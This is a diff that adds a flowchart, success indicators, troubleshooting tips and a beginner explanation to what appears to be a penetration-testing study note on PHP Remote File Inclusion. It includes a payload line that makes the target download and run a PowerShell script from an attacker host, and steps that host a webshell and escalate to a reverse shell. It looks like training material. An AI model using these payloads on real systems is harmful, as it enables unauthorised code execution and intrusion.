@@ -39,6 +39,31 @@ LFI confirmed — does it also load remote URLs?
     └── ?page=http://<LHOST>/shell.php&cmd=powershell+-c+"iex(iwr http://<LHOST>/shell.ps1)"
 ```
 
+## Visual Flow
+
+```mermaid
+flowchart TD
+    A["File inclusion parameter found<br/>e.g. index.php?page="] --> B["Host a webshell on Kali<br/>python3 http.server in /usr/share/webshells/php"]
+    B --> C["Point the parameter at your URL<br/>?page=http://your-IP/simple-backdoor.php&cmd=ls"]
+    C --> D{"Did your command run?"}
+    D -->|No hit on your server| E["allow_url_include is Off<br/>fall back to LFI or PHP wrappers"]
+    D -->|Output returned| F["✅ RFI = remote code execution"]
+    F --> G["Run commands via &cmd=<br/>then upgrade to a reverse shell"]
+    G --> H["🐚 Interactive shell on target"]
+```
+
+> [!success] What success looks like
+> The page response now includes the output of your command. Including `simple-backdoor.php` with `&cmd=ls` returns a directory listing (`admin.php`, `bavarian.php`, `index.php`, ...) embedded inside the page, and your `python3 -m http.server` logs a GET for `simple-backdoor.php`.
+
+> [!danger] Common errors
+> - Your server never gets a hit → `allow_url_include` is disabled (common); RFI won't work, switch to LFI/log poisoning or PHP wrappers.
+> - Web server not reachable → make sure `python3 -m http.server 80` runs from the directory holding the webshell and the target can reach your IP.
+> - `&` or special chars mangled in the URL → wrap the URL in quotes for curl and URL-encode if needed. See [[🔣 Encoding Reference]].
+> Full list: [[⚠️ Common Errors & Troubleshooting]]
+
+> [!tip] Beginner note
+> RFI is like LFI but the included file lives on *your* machine instead of the target's. Because PHP executes whatever it includes, pointing the `page=` parameter at your hosted PHP webshell makes the target run your code — instant remote code execution.
+
 ## Resources
 - [HackTricks — RFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion#rfi)
 - [PayloadsAllTheThings — RFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#remote-file-inclusion)
